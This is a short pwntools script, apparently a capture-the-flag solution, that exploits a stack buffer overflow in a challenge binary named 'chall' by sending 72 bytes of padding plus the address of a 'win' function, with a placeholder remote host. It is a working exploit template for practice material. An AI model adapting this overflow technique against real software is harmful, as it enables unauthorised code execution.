#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()
    
    win_addr = exe.symbols['win']
    r.sendline(cyclic(72) + p64(win_addr))

    r.interactive()


if __name__ == "__main__":
    main()
